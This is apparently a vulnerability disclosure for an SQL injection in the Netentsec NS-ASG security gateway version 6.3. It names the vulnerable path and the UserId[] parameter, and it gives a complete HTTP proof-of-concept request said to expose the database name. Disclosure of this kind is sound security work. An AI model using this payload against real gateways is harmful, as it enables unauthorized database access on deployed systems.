Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.


official： https://www.netentsec.com/

version:6.3

Vulnerability Path ：/ admin/list_localuser.php




As shown in the figure, in the delete method, the array $ResId variable is accepted, and then $sourdeststr is traversed to be injected into SQL without any restrictions, resulting in SQL injection

<img width="586" alt="图片" src="https://github.com/dtxharry/cve/assets/118646996/84d5037b-5ee2-4bdb-a3f2-4da58d229400">



Login account password, construct POC as follows, successfully verify the existence of SQL injection in the UserId [] parameter, and expose the database name
Poc：
```
GET /admin/list_localuser.php?action=delete&UserId[]=111*&&UserId[]=222 HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=8f6eb605230a5ac1e25d4bc6478a140d
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```
<img width="592" alt="图片" src="https://github.com/dtxharry/cve/assets/118646996/c48b109d-6c3a-4a00-be4c-dbd39f29d81e">
